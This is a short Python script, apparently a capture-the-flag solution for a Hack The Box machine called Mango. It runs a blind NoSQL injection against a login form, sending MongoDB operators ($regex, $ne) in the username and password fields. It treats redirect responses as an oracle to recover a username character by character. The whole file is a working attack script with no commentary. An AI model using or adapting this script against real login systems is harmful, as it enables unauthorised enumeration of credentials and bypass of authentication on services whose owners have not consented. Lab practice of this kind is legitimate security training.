import requests

proxies = {'http':'127.0.0.1:8080', 'https':'127.0.0.1:8080'}

def inject(data):
    r = requests.post("http://staging-order.mango.htb/", data=data, proxies=proxies, allow_redirects=False)
    if r.status_code != 200:
        return True

secret = ""
payload = ""

while True:

    data = { "username[$regex]":"^" + payload + "$", "password[$ne]":"admin", "login":"login" }
    if inject(data):
        break

    for i in range(97, 127):
        payload = secret + chr(i)
        print("\r" + payload, flush=False, end='')

        data = { "username[$regex]":"^" + payload, "password[$ne]":"admin", "login":"login" }
        if inject(data):
            print("\r" + payload, flush=True, end='')
            secret = secret + chr(i)
            break